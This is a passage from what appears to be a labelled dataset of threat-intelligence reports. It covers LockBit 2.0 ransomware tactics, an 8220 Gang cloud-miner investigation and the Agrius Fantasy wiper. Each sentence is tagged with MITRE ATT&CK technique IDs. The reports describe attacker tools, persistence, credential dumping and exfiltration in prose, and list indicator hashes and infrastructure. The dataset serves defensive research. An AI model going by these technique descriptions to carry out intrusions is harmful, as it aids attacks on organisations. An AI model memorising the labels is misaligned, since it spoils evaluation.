            "As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022 shared on leak sites. ",
            "Additionally, the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total.",
            "The site itself typically features information such as victim domains, a time tracker and measures of how much data was compromised. Figure 2.",
            "LockBit 2.0 leak site extortion site.",
            "LockBit 2.0 claims that they have demanded ransom from at least 12,125 companies, as shown in the figure below. ",
            "Figure 3.",
            "Source: VX-underground.",
            "According to leak site data for LockBit 2.0, since its inception in June 2021, the RaaS has affected many companies globally, with top victims based in the U.S., Italy and Germany. Figure 4.",
            "LockBit 2.0 geographical impact chart.",
            "LockBit 2.0 has also impacted various victims across multiple industry verticals.",
            "Its most highly targeted industry verticals include professional services, construction, wholesale and retail and manufacturing. Figure 5.",
            "LockBit 2.0 impacted industry vertical chart.",
            "When looking at leak site data across all ransomware families, we\u2019ve observed LockBit 2.0 targeting the highest number of organizations in the following regions: JAPAC, EMEA, and LATAM. ",
            "Unit 42 Incident Response Data on LockBit 2.0 Cases handled by Unit 42 security consultants involving LockBit 2.0 since its appearance in June 2021 demonstrate shorter dwell times and less flexibility in negotiation in the beginning of FY 2022 (measured October-September) in comparison to the end of FY 2021.",
            "The following data is broken into fiscal years and quarters based on when the threat actor breached the network, not when the activity was noticed by a client. ",
            "LockBit 2.0 has shown a decrease in dwell time in FY 2022.",
            "From the last two quarters of FY 2021 to the first two quarters of FY 2022, there has been an average 37-day difference. ",
            "Figure 6.",
            "LockBit 2.0 average dwell time by fiscal quarter.",
            "The difference in initial and final ransom demands over the past fiscal year has been converted to percentages and then averaged.",
            "The graph below demonstrates that at the end of FY 2021, threat actors using LockBit 2.0 were much more open to negotiations of ransom amounts; during that time the ransom was dropped approximately 83% from the initial ask on average.",
            "In comparison, we see less flexibility in FY 2022 Q1 and Q3 \u2013 threat actors only offered an average of about 30% as a price drop.",
            "FY 2022 Q2 is not included due to lack of sufficient information. ",
            "Figure 7.",
            "LockBit 2.0 average difference in initial vs final ransom amount, shown as percentages.",
            "LockBit 2.0 Tactics, Techniques and Procedures Technically speaking, we have observed LockBit 2.0 affiliates leveraging the following tactics, techniques and procedures: TA0001 Initial Access T1078 Valid Accounts Credentials that have either been reused across multiple platforms or have previously been exposed.",
            "Additionally, this includes VPN accounts \u2013 not just domain and local accounts. ",
            "T1133",
            "External Remote Services Affiliates have been seen brute forcing exposed RDP services and compromising accounts with weak passwords. ",
            "T1190 Exploit Public-Facing Applications Vulnerabilities such as ProxyShell (CVE-2021-34473) and improper SQL sanitization (CVE-2021-20028)",
            "have been observed being utilized as footholds into the environment. ",
            "TA0002 Execution T1053.005 Scheduled Task/Job Scheduled Task.",
            "LockBit 2.0 can be executed via scheduled tasks. ",
            "T1059",
            "Command and Scripting Interpreter LockBit 2.0 is typically executed via command line arguments via a hidden window. ",
            "Windows SysInternals PsExec has been utilized for both persistence and execution purposes.",
            "Its ability to execute processes on other systems spread the ransomware and assisted in reconnaissance activities. ",
            "TA0003 Persistence T1053.005 Scheduled Task/Job Scheduled Task.",
            "It was quite common to see scheduled tasks used to create persistence for the ransomware executable, PsExec, and occasionally some defense evasion batch scripts. ",
            "T1078",
            "Valid Accounts Compromised accounts may be used to maintain access to the network. ",
            "T1136.001",
            "Create Account ",
            "In rare cases, LockBit 2.0 has been observed to create accounts for persistence with simple names, such as \u201ca.\u201d T1505.003 Server Software Component With the upsurgence of ProxyShell, webshells have become more common entry points. ",
            "TA0004 Privilege Escalation T1068 Exploitation for Privilege Escalation The ProxyShell elevation of privilege on the Exchange PowerShell Backend (CVE-2021-34523), Windows Background Intelligent Transfer Service (BITS) improperly handling symbolic links (CVE-2020-0787), and abusing the CMSTPLUA COM interface have all been seen as methods of privilege escalation. ",
            "T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control LockBit 2.0 has utilized a UAC bypass tool. ",
            "TA0005 Defense Evasion T1070 Indicator Removal on Host Indicators, such as logs in Windows Event Logs or malicious files, are typically removed using wevtutil, a batch script, or CCleaner. ",
            "T1140 Deobfuscate/Decode Files or Information Most PowerShell scripts involved in LockBit 2.0 cases are Base64 encoded. ",
            "T1484.001 Domain Policy Modification:",
            "Group Policy Modification LockBit 2.0 has been seen using the PowerShell module InvokeGPUpdate to update the group policy. ",
            "T1562.001",
            "Impair Defenses: Disable or Modify Tools Windows Defender, other anti-malware solutions and monitoring tools are disabled utilizing a process explorer tool, a batch script or a specially crafted command line script. ",
            "T1564.003",
            "Hide Artifacts: Hidden Window Affiliates use hidden windows to hide malicious activity from plain sight. ",
            "TA0006 Credential Access T1003 OS Credential Dumping As seen with other ransomware cases, Mimikatz is a key player in dumping credentials but LockBit 2.0 has been occasionally seen utilizing MiniDump as well. ",
            "T1555 Credentials from Password Stores LockBit 2.0 has been seen utilizing numerous tools to dump passwords from password stores and Chrome using GrabChrome and GrabRFF. ",
            "TA0007 Discovery T1046 Network Service Discovery Both Advanced Port Scanner and NetScan have been used to discover local network infrastructure devices and services running on remote hosts.",
            "Active Directory queries for remote systems have been performed by ADFind. ",
            "T1057 Process Discovery Process Explorer, Process Monitor and PCHunter have been utilized to discover any anti-malware or monitoring software and terminate it. ",
            "T1082 System Information Discovery LockBit 2.0 enumerates system information such as hostname, shares, and domain information. ",
            "T1614 System Location Discovery Attempts to check the language settings. ",
            "TA00008 Lateral Movement T1021",
            "Remote Services Although Cobalt Strike has many capabilities beneficial to threat actors in ransomware attacks, it was mainly seen in LockBit 2.0 investigations acting as a command and control beacon, a method of lateral movement and a tool for downloading/executing files. ",
            "T1021.002 Remote Services: SMB/Windows Admin Shares LockBit 2.0 has been known to self-propagate via SMB. ",
            "TA0010 Exfiltration T1030 Data Transfer Size Limits In some cases, LockBit 2.0 will limit the data transfer sizes to fly under the radar of any monitoring services a client may have set up. ",
            "T1041 Exfiltration over C2 Channel MEGASync is the leading way for LockBit 2.0 affiliates to exfiltrate data from clients with it being occasionally replaced by RClone. TA0011 Command and Control T1219",
            "Remote Access Software AnyDesk has been the most common legitimate desktop software used to establish an interactive command and control channel, with ConnectWise seen slightly less frequently. ",
            "TA0040 Impact T1486 Data Encrypted for Impact LockBit 2.0 is known for its extortion tactics, encrypting devices and demanding a ransom. ",
            "T1489 Service Stop During the defense evasion phase, anti-malware and monitoring software is often disabled.",
            "Firewall rules have occasionally been seen being disabled as well. ",
            "LockBit 2.0 Technical Details LockBit 2.0 was developed using the Assembly and Origin C programming languages and leverages advanced encryption standard (AES) and elliptic-curve cryptography (ECC) algorithms to encrypt victim data.",
            "It can affect both Windows and Linux OS, as the operator released a Linux version of LockBit 2.0 to target VMware ESXi hypervisor systems in October 2021, coded exclusively in the C programming language. ",
            "The LockBit group claimed that LockBit 2.0 is \u201cthe fastest encryption software all over the world\u201d and provided a comparative table showing the encryption speed of various ransomware samples. ",
            "Figure 8.",
            "LockBit encryption comparative table | Source:",
            "LockBit blog.",
            "LockBit 2.0 also contains a self-spreading feature, clears logs and can print the ransom note on network printers until the paper runs out. ",
            "A management panel that affiliates can use to manage victims and affiliate accounts, generate new ransomware builds and generate the decryptor if the demanded ransom is paid also exists. ",
            "Figure 9.",
            "LockBit 2.0 management panel.",
            "Source: ProDaft.",
            "LockBit 2.0 operators also released an information-stealer dubbed StealBit, which was developed to support affiliates of the LockBit 2.0 RaaS when exfiltrating data from breached companies. ",
            "StealBit contains the following capabilities: Operates as a file grabber and dumps/uploads victim data to the LockBit victim-shaming site. ",
            "No reliance on third-party cloud file-sharing services, where data can be easily removed if the victim submitted a complaint. ",
            "The download speed is limited only by internet connection bandwidth, so it is possible to clone folders from corporate networks and upload them to the LockBit victim shaming blog quickly. ",
            "The operator of LockBit 2.0 has provided a comparative table speed showing the information stealer compared to other tools. Figure 10.",
            "LockBit 2.0 download speed, according to LockBit 2.0 operator.",
            "LockBit 3.0 There was a bug that existed in LockBit 2.0 that allowed researchers to revert the encryption process on an MSSQL database.",
            "After the bug\u2019s disclosure, LockBit forum members discussed how the bug will not exist in LockBit\u2019s next iteration.",
            "Moreover, on March 17, LockBit forum members mentioned the release of LockBit\u2019s next version in one or two weeks.",
            "On March 25, VX underground posted a tweet with details of this new version, dubbed LockBit Black. Figure 11.",
            "LockBit Black post-infection desktop wallpaper (Source: VX-underground).Courses of Action Several adversarial techniques were observed in this activity and the following measures are suggested within Palo Alto Networks products and services to ensure mitigation of threats related to LockBit 2.0 ransomware, as well as other malware using similar techniques: Product / Service Course of Action Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion The courses of action below mitigate the following techniques: Exploit Public-Facing Application",
            "[T1190], Command and Scripting Interpreter [T1059], Local Account [T1136.001], Web Shell",
            "[T1505.003], Exploitation for Privilege Escalation",
            "[T1068], Indicator Removal on Host [T1070], Deobfuscate/Decode Files or Information",
            "[T1140], Disable or Modify Tools [T1562.001], Hidden Window [T1564.003], Valid Accounts",
            "[T1078], External Remote Services [T1133], Scheduled Task",
            "[T1053.005],",
            "Bypass User Account Control",
            "[T1548.002],",
            "Group Policy Modification",
            "[T1484.001] THREAT PREVENTION Ensure a secure Vulnerability Protection Profile is applied to all security rules allowing traffic Ensure a Vulnerability Protection Profile is set to block attacks against critical and high vulnerabilities, and set to default on medium, low, and informational vulnerabilities Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the internet Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use CORTEX XSOAR Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Impossible Traveler NEXT-GENERATION FIREWALLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure that the User-ID service account does not have interactive logon rights Define at least one 'Include Network'. ",
            "Ensure that User-ID is only enabled for internal trusted interfaces Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure remote access capabilities for the User-ID service account are forbidden. ",
            "Ensure that the User-ID Agent has minimal permissions if User-ID is enabled CORTEX XDR PREVENT Enable Anti-Malware Protection Enable Anti-Exploit Protection Configure Host Firewall Profile Configure Behavioral Threat Protection under the Malware Security Profile Credential Access The courses of action below mitigate the following techniques: OS Credential Dumping [T1003], Credentials from Password Stores",
            "[T1555] CORTEX XDR PREVENT Enable Anti-Exploit Protection Enable Anti-Malware Protection Discovery The below courses of action mitigate the following techniques: Network Service Scanning [T1046],",
            "Process Discovery",
            "[T1057], System Location Discovery",
            "[T1614], System Information Discovery [T1082] CORTEX XDR PREVENT Configure Behavioral Threat Protection under the Malware Security Profile NEXT-GENERATION FIREWALLS Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone CORTEX XSOAR Deploy XSOAR Playbook - Port Scan Lateral Movement The courses of action below mitigate the following techniques: Remote Services [T1021], SMB/Windows Admin Shares",
            "[T1021.002] NEXT-GENERATION FIREWALLS Ensure remote access capabilities for the User-ID service account are forbidden. ",
            "Ensure that User-ID is only enabled for internal trusted interfaces Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones CORTEX XSOAR Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Access Investigation Playbook Command and Control ",
            "The courses of action below mitigate the following techniques: Remote Access Software [T1219] NEXT-GENERATION FIREWALLS Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of \u2018block\u2019 or \u2018override\u2019 on the URL categories Ensure that access to every URL is logged CORTEX XSOAR Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Exfiltration ",
            "The courses of action below mitigate the following techniques: Data Transfer Size Limits",
            "[T1030], Exfiltration Over C2 Channel [T1041] THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet ",
            "Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure that PAN-DB URL Filtering is used Ensure that access to every URL is logged Ensure that URL Filtering uses the action of \u2018block\u2019 or \u2018override\u2019 on the URL categories Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet ",
            "Ensure all HTTP Header Logging options are enabled CORTEX XSOAR Deploy XSOAR Playbook - Block URL Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Deploy XSOAR Playbook - Block IP DNS SECURITY Enable DNS Security in Anti-Spyware profile NEXT-GENERATION FIREWALLS Setup NetFlow Monitoring Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Impact The courses of action below mitigate the following techniques: Data Encrypted for Impact [T1486], Service Stop [T1489] CORTEX XSOAR Deploy XSOAR Playbook - Ransomware Manual for incident response. ",
            "\u2020These capabilities are part of the NGFW security subscriptions service Note: This is not an all-inclusive list of the protections provided by Palo Alto Networks.",
            "This is a subset of our current Courses of Action initiative and will be updated as the project progresses. ",
            "Conclusion LockBit 2.0 and its evolution over time is a perfect example to illustrate the persistence, increasing complexity and impact brought by the ransomware landscape as a whole.",
            "With claims of this RaaS offering the fastest encryption on the ransomware market, coupled with the fact that it has been delivered in high volume by experienced affiliates, this RaaS poses a significant threat.",
            "LockBit\u2019s continuation with operations and its next iteration coming up on the horizon means that organizations and their security teams need to stay vigilant in the ever-evolving threat landscape. ",
            "Palo Alto Networks detects and prevents LockBit 2.0 ransomware in the following ways: WildFire:",
            "All known samples are identified as malware. ",
            "Cortex XDR: Identifies indicators associated with LockBit 2.0. ",
            "Anti-Ransomware Module to detect LockBit 2.0 encryption behaviors on Windows. ",
            "Local Analysis detection for LockBit 2.0 binaries on Windows. ",
            "Next-Generation Firewalls:",
            "DNS Signatures detect the known C2 domains, which are also categorized as malware in Advanced URL Filtering. ",
            "If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:",
            "+65.6983.8730 Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.",
            "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
            "Learn more about the Cyber Threat Alliance. ",
            "Appendix A ",
            "In August 2021, a Russian blogger published a 22-minute interview with an alleged representative of the group behind LockBit 2.0 called \u201cLockBitSupp\u201d on a YouTube channel called \u201cRussian-language open source intelligence (OSINT).\u201d",
            "The same Russian blogger previously published interviews with a representative of the group behind the REvil ransomware-as-a-service (RaaS), hackers and security experts. ",
            "Some key takeaways from the claims made in the interview were: The LockBit 2.0 threat actor claimed the group\u2019s RaaS was unlikely to be rebranded since the team allegedly was a business that was honest with their customers \u2013 suggesting a supposed contrast between LockBit 2.0 and Avaddon, DarkSide and REvil affiliates. ",
            "The LockBit 2.0 ransomware disregarded keyboard layout, but it allegedly would not run on a host where the system language was set to any of the languages spoken in the Commonwealth of Independent States region. ",
            "The group did not devise attacks on companies of their choice; they simply worked with initial access to any corporate network they obtained elsewhere, since this was more profitable and saved time.",
            "The team selected targets for ransomware attacks based on the company\u2019s finances \u2014 the bigger, the better.",
            "The location also did not matter.",
            "However, team members allegedly did not attack healthcare facilities, social services, educational institutions and charitable organizations or any other organization that \u201ccontributed to the survival of the human race.\u201d",
            "[Note that Unit 42 case data does include indications that threat actors using LockBit 2.0 have targeted healthcare organizations at times.] ",
            "The threat actor claimed that the largest number of victims who paid ransom were company representatives who did not care about creating backup copies and did not protect their sensitive data.",
            "According to the threat actor\u2019s claims, companies that violated regulations about collecting and handling customer or user personal information were among those eager to pay.",
            "The threat actor claimed that there generally were only a few companies who refused to pay ransom on principle, while most of the victims evaluated profit and loss to decide whether or not to pay a ransom. ",
            "LockBit 2.0 operators allegedly almost always offered discounts to their victims since the goal was to streamline attacks. ",
            "The threat actor claimed that the COVID-19 pandemic facilitated ransomware attacks significantly, saying it was easy to compromise home computers of employees who work remotely and use them as a springboard to access other networked systems. ",
            "Companies in Europe and the U.S. were hit with ransomware much more often than companies based in other countries allegedly because of high profit and insurance and not because of language barriers. ",
            "Ransomware operators usually recruit negotiators, who coerce victims to pay ransom, since professional penetration testers allegedly lack the time for chatter. ",
            "Additional Resources LockBit 3.0: Another Upgrade to the World\u2019s Most Active RansomwareRansomware Groups to Watch: Emerging ThreatsAverage Ransom Payment Up 71% This Year, Approaches $1 Million2022 Unit 42 Ransomware Threat Report Highlights Get updates from Palo Alto Networks! ",
            "Sign up to receive the latest news, cyber threat intelligence and research from us "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1210",
                "T1110"
            ],
            [
                "T1190"
            ],
            [],
            [],
            [
                "T1053.005"
            ],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [
                "T1059.003",
                "T1053.005"
            ],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [
                "T1068"
            ],
            [
                "T1548.002"
            ],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [],
            [
                "T1484.001"
            ],
            [],
            [
                "T1562.001",
                "T1059.003"
            ],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [],
            [],
            [],
            [
                "T1082"
            ],
            [],
            [],
            [
                "T1570"
            ],
            [
                "T1570"
            ],
            [],
            [],
            [
                "T1219"
            ],
            [],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "SOC Team Essentials  How to Investigate and Track the 8220 Gang Cloud Threat",
        "cti_report": [
            "title: SOC Team Essentials | How to Investigate and Track the 8220 Gang Cloud Threat url: https://www.sentinelone.com/blog/soc-team-essentials-how-to-investigate-and-track-the-8220-gang-cloud-threat/ 8220 Gang is a low-skill crimeware actor known for infecting cloud hosts through n-day vulnerabilities and remote access brute forcing.",
            "We have previously detailed how 8220 expanded its botnet and rotated its infrastructure.",
            "Since our last write up in October, the group has again switched to new infrastructure and samples, providing us with an opportunity to share an educational walkthrough of the process of investigating cybercrime activity that may be useful to new or lesser experienced SOC teams, analysts and researchers. ",
            "In this post, we use 8220 Gang activity as a lens through which to explain the process of investigating a threat, researching the threat activity as a whole, and gaining a perspective into attacker objectives, ultimately concluding with a wider understanding of related threat intelligence. ",
            "Refresher on 8220 Gang 8220 Gang (pronounced eighty-two twenty), also known as 8220 Mining Group, was first publicly reported by Talos in 2018.",
            "Victims of 8220 Gang are typically, but not exclusively, users of cloud networks operating vulnerable and misconfigured Linux applications and services. ",
            "Attacks make use of SSH brute forcing post-infection to automate local and global spreading attempts.",
            "Victims using cloud infrastructure (AWS, Azure, GCP, Aliyun, QCloud) are often infected via publicly accessible hosts running Docker, Confluence, Apache WebLogic, and Redis.",
            "Victims are not targeted geographically but simply identified by their internet accessibility. ",
            "Initial Discovery Our walkthrough starts with the initial discovery of an interesting script found on a compromised AWS machine with publicly available SSH service secured with weak credentials.",
            "For readers not running a honeypot, this initial discovery could have also been observed in the monitoring of new files uploaded to file scanning services like VirusTotal or MalShare.",
            "For those looking to monitor this group, international SSH honeypots plus VirusTotal YARA rules offer a reliable method of catching new activity as it occurs. ",
            "The script in question has the SHA1 a9da0947243333d95f84f6a0e37b9fc29b2fb054. 8220 Infection Script Snippet We can see it is quite simple in design and built around the process of downloading and setting persistence of some other file. ",
            "With a few string pivots inside VT, or even a few Google searches, we can quickly discover the core functionality of the script has been widely reported on as it has been reused by many amateur cryptocurrency mining groups and opportunistic profit-seeking attackers. ",
            "Pivoting on part of the script\u2019s content in VirusTotal Intelligence One example of such reporting is our July 2022 post on 8220 Gang expanding their botnet to roughly 30,000 hosts.",
            "However, this time the attacker-specific infrastructure is different, and we have not determined if it has delivered similar malware.",
            "Remember, this \u201cinfection script\u201d is used by many attackers, and it alone is a very weak source of attribution. 8220 Infection Script Analysis The script goes through a set of instructions, often at multiple levels of encoded commands, aimed at the delivery of setting persistence on the victim machine by downloading itself from malicious servers.",
            "The multiple levels of Base64 encoding attempt to hide the fact that it is also downloading a specific payload as well.",
            "This is first observed under the createservices function. ",
            "Infection Script createservices Function One difference that\u2019s quickly apparent to past reporting on the script is that the attacker began adding the lwp-download command as a failover for wget and curl to enable downloading commands.",
            "We initially observed this activity on January 6th, and since then the actor has continued to standardize it in their infection scripts today.",
            "Sysdig also noted this activity in a recent blog. ",
            "Infection Script use of lwp-download The key take away from analyzing these infection scripts is noting unique additions, like lwp\u2013download, combined with the destination of download requests.",
            "By clustering infection scripts based on function names and order, if the functions are called, and what infrastructure is associated, we can weed out the non-8220 Gang samples. ",
            "Additionally, we can link this further based on the encoding quantity and repetition to past 8220 Gang samples.",
            "For example, in our infection scripts createservices makes use of three base64 encoded echo commands.",
            "The first command can be decoded into a new script which pings associated attacker infrastructure and then starts a \u201cpayload\u201d command. Infection Script\u2019s encoded payload ",
            "The payload contains two additional base64 encoded scripts to set permissions, download, and configure miner and IRC bot infections.",
            "This functionality communicates with 194.38.23[.]170. ",
            "Post-Infection Activity & Sample Pivots The post infection activity for this and other recent 8220 infection scripts evolve slightly, but generally proceed with infecting the victim with an updated PwnRig cryptocurrency miner and IRC bot. ",
            "In the infection scripts we observed in this campaign, the group continued to use old bash IRC bot \u201cTsunami\u201d.",
            "The sample delivered remains unchanged; however, the network it communicates with evolves over campaigns.",
            "The infection script here delivered 472548a4b8295182f6ba8641d74725c2250b7243 \u2013 the Tsunami sample. ",
            "More useful for tracking 8220 Gang are the samples of PwnRig \u2013 the custom version of the open source XMRig cryptocurrency miner \u2013 that they drop.",
            "In this campaign, the script downloads the UPX packed sample 38be55f1fc4ce1cb5438236abc5077019e5e1cdf, which unpacks to 332485bd460f55117a254f8164736b90d74aa9f6.",
            "A characteristic of 8220 Gang is their repeated use of fake miner pool domains themed around the FBI.",
            "Here, we see this theme again through the use of the malicious domain fbi.su1001-2[.]top. ",
            "Infrastructure Analysis Tracking 8220 Gang is aided somewhat by their failures in infrastructure OPSEC.",
            "Since the beginning of what the industry calls \u201c8220 Gang\u201d the primary method of attribution has been reused infrastructure and identification of newly associated infrastructure.",
            "While this technique alone does not link the actor with certainty, it remains reliable when combined with the previously noted linkability around malware samples delivered. ",
            "During our initial investigation in January, the group was using 185.106.94[.]146, and dw.bpdeliver[.]ru for malware download location post-infection such as in their infection script.",
            "Anyone looking into this group should pivot on all subdomains associated with the actor-controlled domain, in addition to all DNS history of malicious IPs to identify a wider set of the malicious activity. ",
            "For example, the recent dw.bpdeliver[.]ru host resolved to 79.137.203[.]156 during the initial deployment of the script.",
            "More activity of 8220 Gang scripts can be found calling directly to this IP rather than the domain.",
            "The same goes for 185.106.94[.]146, which is called by IP in the script, and which at the time resolved to jira.letmaker.top, a widely reported known 8220 Gang domain. ",
            "Overall, the group is clumsy and unsophisticated in their infrastructure management, providing a good opportunity for those willing to track the mess or cut their teeth in threat actor investigation. ",
            "Our graphic from a previous campaign explains the overlap, which can still be found in this most recent activity. ",
            "Visual Context of 8220 Gang Infrastructure Roles Conclusion Tracking and researching 8220 Gang, which has exhibited a lack of operational security, requires a simple understanding of their use of malicious scripts, malware samples, and malicious infrastructure.",
            "A successful approach to tracking this group can involve monitoring and analyzing malware samples, identifying patterns in their malicious scripts, and mapping out their infrastructure. Indicators of Compromise Indicator Description a9da0947243333d95f84f6a0e37b9fc29b2fb054 8220 Gang Install Script 472548a4b8295182f6ba8641d74725c2250b7243 8220 Gang Bashirc.x86_64 \u2013 PackedOld version, \u201cTsunami\u201d 38be55f1fc4ce1cb5438236abc5077019e5e1cdf 8220 Gang X86_64 \u2013 Packed MinerUses fbi.su1001-2[.]top 332485bd460f55117a254f8164736b90d74aa9f6 e2c3e.",
            "Unpacked, PwnRig Miner 194.38.23.170 8220 Gang Infrastructure \u2013 Shared jira.letmaker.top 8220 Gang Infrastructure \u2013 Reused 185.106.94.146 8220 Gang Infrastructure dw.bpdeliver.ru 8220 Gang Infrastructure \u2013 Recent fbi.su1001-2.top 8220 Gang Infrastructure \u2013 Recent 79.137.203.156 8220 Gang Infrastructure "
        ],
        "label": [
            [
                "T1110"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1110"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [
                "T1027",
                "T1105"
            ],
            [
                "T1027",
                "T1105"
            ],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1027",
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Fantasy  a new Agrius wiper deployed through a supplychain attack",
        "cti_report": [
            "title: Fantasy \u2013 a new Agrius wiper deployed through a supply\u2011chain attack url: https://www.welivesecurity.com/2022/12/07/fantasy-new-agrius-wiper-supply-chain-attack/ ESET researchers analyzed a supply-chain attack abusing an Israeli software developer to deploy Fantasy, Agrius\u2019s new wiper, with victims including the diamond industry ESET researchers discovered a new wiper and its execution tool, both attributed to the Agrius APT group, while analyzing a supply-chain attack abusing an Israeli software developer.",
            "The group is known for its destructive operations. ",
            "In February 2022, Agrius began targeting Israeli HR and IT consulting firms, and users of an Israeli software suite used in the diamond industry.",
            "We believe that Agrius operators conducted a supply-chain attack abusing the Israeli software developer to deploy their new wiper, Fantasy, and a new lateral movement and Fantasy execution tool, Sandals. ",
            "The Fantasy wiper is built on the foundations of the previously reported Apostle wiper but does not attempt to masquerade as ransomware, as Apostle originally did.",
            "Instead, it goes right to work wiping data.",
            "Victims were observed in South Africa \u2013 where reconnaissance began several weeks before Fantasy was deployed \u2013 Israel, and Hong Kong. ",
            "Key points of this blogpost: Agrius conducted a supply-chain attack abusing an Israeli software suite used in the diamond industry. ",
            "The group then deployed a new wiper we named Fantasy.",
            "Most of its code base comes from Apostle, Agrius\u2019s previous wiper. ",
            "Along with Fantasy, Agrius also deployed a new lateral movement and Fantasy execution tool that we have named Sandals. ",
            "Victims include Israeli HR firms, IT consulting companies, and a diamond wholesaler; a South African organization working in the diamond industry; and a jeweler in Hong Kong. ",
            "Group overview Agrius is a newer Iran-aligned group targeting victims in Israel and the United Arab Emirates since 2020.",
            "The group initially deployed a wiper, Apostle, disguised as ransomware, but later modified Apostle into fully fledged ransomware.",
            "Agrius exploits known vulnerabilities in internet-facing applications to install webshells, then conducts internal reconnaissance before moving laterally and then deploying its malicious payloads. ",
            "Campaign overview On February 20th, 2022 at an organization in the diamond industry in South Africa, Agrius deployed credential harvesting tools, probably in preparation for this campaign.",
            "Then, on March 12th, 2022, Agrius launched the wiping attack by deploying Fantasy and Sandals, first to the victim in South Africa and then to victims in Israel and lastly to a victim in Hong Kong. ",
